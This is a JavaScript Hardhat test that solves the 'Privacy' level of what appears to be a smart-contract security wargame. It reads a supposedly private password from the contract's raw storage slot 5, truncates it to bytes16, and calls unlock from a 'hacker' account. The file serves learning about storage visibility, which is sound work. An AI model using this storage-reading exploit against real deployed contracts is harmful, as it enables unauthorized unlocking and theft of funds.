const { expect } = require("chai");
const { ethers } = require("hardhat");
const { consoleLogTitleH1, consoleLogMessage } = require("./utils.js");

describe("Privacy", function () {
  let deployer;
  let hacker;
  let tester;

  before(async function () {
    consoleLogTitleH1("Level 12 - Privacy");

    consoleLogMessage(`💻 Network: ${hre.network.name}`);

    // 🔨 Addresses
    [deployer, hacker, tester] = await ethers.getSigners();
  });

  it("Should hack the private variable to unlock the contract", async function () {
    // 🔨 Addresses
    [deployer, hacker, tester] = await ethers.getSigners();

    const pwd = "password123";
    const pwdByte32 = ethers.utils.formatBytes32String(pwd);
    consoleLogMessage("🔑 Initial password (string):", pwd);
    const data = [
      ethers.utils.formatBytes32String("1"),
      ethers.utils.formatBytes32String("2"),
      pwdByte32,
    ];
    consoleLogMessage("🔑 Initial data (byte32):", data);

    // 📗 Contract to be hacked
    const Contract = await ethers.getContractFactory("Privacy", deployer);
    const contract = await Contract.connect(deployer).deploy(data);
    await contract.deployed();

    // 🗣 Logging status
    consoleLogMessage("\n\n======================");
    consoleLogMessage("👀 Storage");
    consoleLogMessage("======================");
    let storageValue;
    for (let i = 0; i < 7; i++) {
      storageValue = await ethers.provider.getStorageAt(contract.address, i);
      consoleLogMessage(`Index ${i}: ${storageValue}`);
    }
    consoleLogMessage("======================\n\n");

    // 👿 Hacking the contract
    // 📖 https://docs.ethers.io/v5/api/providers/provider/
    let dataHackedByte32;

    let index = 5; // index where data[2] is stored
    dataHackedByte32 = await ethers.provider.getStorageAt(
      contract.address,
      index
    );

    // 🗣 Logging status
    consoleLogMessage(
      "🔑 Hacked password (byte32) - value: ",
      dataHackedByte32
    );
    consoleLogMessage(
      "🔑 Hacked password (byte32) - length:",
      ethers.utils.hexDataLength(dataHackedByte32)
    );
    let locked = await contract.locked();
    consoleLogMessage("🔑 Lock status before unlocking:", locked);

    // ✍ Unlock the contract
    let dataHackedByte16 = await contract.conversion(dataHackedByte32); // Option 1
    dataHackedByte16 = dataHackedByte32
      .toString()
      .substring(0, dataHackedByte32.toString().length / 2 + 1); // Option 2

    consoleLogMessage(
      "🔑 Hacked password (byte16) - value: ",
      dataHackedByte16
    );
    let unlockTx = await contract.connect(hacker).unlock(dataHackedByte16);
    await unlockTx.wait((confirms = 1));

    // 🗣 Logging status
    locked = await contract.locked();
    consoleLogMessage("🔑 Lock status after unlocking:", locked);

    // ✅ Check if the hack was successful
    expect(locked).to.be.false;
  });
});
